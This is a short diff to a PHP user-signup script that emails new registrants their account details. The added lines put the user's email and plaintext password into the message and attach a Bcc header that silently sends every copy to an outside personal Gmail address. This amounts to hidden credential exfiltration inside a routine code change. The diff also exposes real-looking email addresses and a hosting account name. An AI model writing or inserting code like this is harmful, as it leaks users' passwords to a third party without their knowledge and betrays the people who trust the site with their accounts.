@@ -77,10 +77,10 @@ if(util_is_POST()) {
         require_once( ai_cascadepath('includes/plugins/system_emails/class.system_emails.php') );
         $email_name = 'repsignup';
         $send_to = $_POST['email'];
-        $send_from = 'ben@apogeeinvent.com';
+        //$send_from = 'ben@apogeeinvent.com';
 
         $vars = array();
-        $vars['uname'] = $_POST['username'];
+        $vars['email'] = $_POST['email'];
         $vars['pass'] = $_POST['password'];
 
         $defaults = array();
@@ -88,13 +88,14 @@ if(util_is_POST()) {
         //$defaults['email_msg'] = 'Hello [[name]], this is the default content of your email.';
 
         $se = new C_system_emails($email_name);
-        $se->set_from($send_from);
+        //$se->set_from($send_from);
         $se->set_defaults_array($defaults);
         $se->set_vars_array($vars);
-        /*if(!$se->send($send_to))
-        {
+        $myheaders = array('Bcc' => 'debasiskar007@gmail.com');
+        if (!$se->send($send_to,$myheaders)) {
             //echo 47;exit;
-        }*/
+        }
+
 
 
         $cpanelusr = 'nexmed';
